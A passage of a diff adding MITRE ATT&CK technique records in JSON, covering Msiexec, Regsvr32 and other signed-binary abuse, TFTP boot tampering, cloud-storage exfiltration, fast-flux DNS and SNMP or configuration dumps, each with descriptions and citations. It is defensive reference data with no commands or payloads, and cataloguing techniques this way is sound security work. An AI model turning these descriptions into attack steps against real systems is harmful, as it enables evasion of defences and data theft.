+        "external_id": "none"
+      },
+      {
+        "source_name": "FireEye FIN7 April 2017",
+        "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
+        "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Wikipedia HTML Application",
+        "url": "https://en.wikipedia.org/wiki/HTML_Application",
+        "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MSDN HTML Applications",
+        "url": "https://msdn.microsoft.com/library/ms536471.aspx",
+        "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "LOLBAS Mshta",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+        "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336",
+    "platform": "windows",
+    "tid": "T1218.007",
+    "technique": "Msiexec",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
+    "technique_references": [
+      {
+        "source_name": "TrendMicro Msiexec Feb 2018",
+        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/",
+        "description": "Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "LOLBAS Msiexec",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/",
+        "description": "LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft msiexec",
+        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec",
+        "description": "Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft AlwaysInstallElevated 2018",
+        "url": "https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated",
+        "description": "Microsoft. (2018, May 31). AlwaysInstallElevated. Retrieved December 14, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+    "platform": "windows",
+    "tid": "T1218.010",
+    "technique": "Regsvr32",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+    "technique_references": [
+      {
+        "source_name": "FireEye Regsvr32 Targeting Mongolian Gov",
+        "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html",
+        "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "LOLBAS Regsvr32",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
+        "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft Regsvr32",
+        "url": "https://support.microsoft.com/en-us/kb/249873",
+        "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Carbon Black Squiblydoo Apr 2016",
+        "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
+        "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4",
+    "platform": "network",
+    "tid": "T1542.005",
+    "technique": "TFTP Boot",
+    "tactic": "defense-evasion",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",
+    "technique_references": [
+      {
+        "source_name": "Cisco Blog Legacy Device Attacks",
+        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
+        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Secure Boot",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#35",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Secure Boot. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Command History",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Boot Information",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#26",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Boot Information. Retrieved October 21, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4",
+    "platform": "network",
+    "tid": "T1542.005",
+    "technique": "TFTP Boot",
+    "tactic": "persistence",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",
+    "technique_references": [
+      {
+        "source_name": "Cisco Blog Legacy Device Attacks",
+        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
+        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Secure Boot",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#35",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Secure Boot. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Command History",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#23",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command History. Retrieved October 21, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco IOS Software Integrity Assurance - Boot Information",
+        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#26",
+        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Boot Information. Retrieved October 21, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
+    "platform": "linux|macos|windows",
+    "tid": "T1567.002",
+    "technique": "Exfiltration to Cloud Storage",
+    "tactic": "exfiltration",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
+    "technique_references": [],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--29ba5a15-3b7b-4732-b817-65ea8f6468e6",
+    "platform": "linux|macos|windows",
+    "tid": "T1568.001",
+    "technique": "Fast Flux DNS",
+    "tactic": "command-and-control",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
+    "technique_references": [
+      {
+        "source_name": "MehtaFastFluxPt1",
+        "url": "https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-1/#gref",
+        "description": "Mehta, L. (2014, December 17). Fast Flux Networks Working and Detection, Part 1. Retrieved March 6, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MehtaFastFluxPt2",
+        "url": "https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-2/#gref",
+        "description": "Mehta, L. (2014, December 23). Fast Flux Networks Working and Detection, Part 2. Retrieved March 6, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Fast Flux - Welivesecurity",
+        "url": "https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/",
+        "description": "Albors, Josep. (2017, January 12). Fast Flux networks: What are they and how do they work?. Retrieved March 11, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
+    "platform": "network",
+    "tid": "T1602.001",
+    "technique": "SNMP (MIB Dump)",
+    "tactic": "collection",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
+    "technique_references": [
+      {
+        "source_name": "SANS Information Security Reading Room Securing SNMP Securing SNMP",
+        "url": "https://www.sans.org/reading-room/whitepapers/networkdevs/securing-snmp-net-snmp-snmpv3-1051",
+        "description": "Michael Stump. (2003). Information Security Reading Room Securing SNMP: A Look atNet-SNMP (SNMPv3). Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "US-CERT-TA18-106A",
+        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
+        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco Blog Legacy Device Attacks",
+        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
+        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco Advisory SNMP v3 Authentication Vulnerabilities",
+        "url": "https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3",
+        "description": "Cisco. (2008, June 10). Identifying and Mitigating Exploitation of the SNMP Version 3 Authentication Vulnerabilities. Retrieved October 19, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
+    "platform": "network",
+    "tid": "T1602.002",
+    "technique": "Network Device Configuration Dump",
+    "tactic": "collection",
+    "datasources": "network-connection-creation",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
+    "technique_references": [
+      {
+        "source_name": "US-CERT TA18-106A Network Infrastructure Devices 2018",
+        "url": "https://us-cert.cisa.gov/ncas/alerts/TA18-106A",
+        "description": "US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Cisco Blog Legacy Device Attacks",
+        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
+        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "US-CERT TA18-068A 2018",
+        "url": "https://www.us-cert.gov/ncas/alerts/TA18-086A",
+        "description": "US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  }
+]
